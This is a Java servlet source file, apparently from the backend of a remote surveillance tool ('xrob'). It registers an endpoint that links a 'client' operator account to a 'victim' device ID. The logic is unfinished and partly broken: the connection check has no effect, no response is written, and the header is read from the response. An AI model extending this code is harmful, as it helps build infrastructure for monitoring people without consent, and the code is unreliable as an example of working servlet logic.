package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.ClientVictimRelations;
import com.theah64.xrob.api.database.tables.Clients;
import com.theah64.xrob.api.models.Client;
import com.theah64.xrob.api.utils.HeaderSecurity;
import com.theah64.xrob.api.utils.Request;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * Created by theapache64 on 12/9/16.
 */
@WebServlet(urlPatterns = {BaseServlet.VERSION_CODE + "/connect/client_to_victim"}, name = "ConnectClientToVictimServlet")
public class ConnectClientToVictimServlet extends BaseServlet {

    private static final String[] REQUIRED_PARAMS = {Clients.COLUMN_CLIENT_CODE};

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType(CONTENT_TYPE_JSON);
        final PrintWriter out = response.getWriter();
        try {
            final HeaderSecurity hs = new HeaderSecurity(response.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
            final Request connectRequest = new Request(request, REQUIRED_PARAMS);

            final String clientCode = connectRequest.getStringParameter(Clients.COLUMN_CLIENT_CODE);
            final String clientId = Clients.getInstance().get(Clients.COLUMN_CLIENT_CODE, clientCode, Clients.COLUMN_ID);
            if (clientId != null) {
                final String victimId = hs.getVictimId();
                final boolean isAlreadyConnected = ClientVictimRelations.getInstance().isConnected(clientId, victimId);
            } else {
                throw new Exception("Client doesn't exist with client code : " + clientCode);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        out.flush();
        out.close();
    }

}
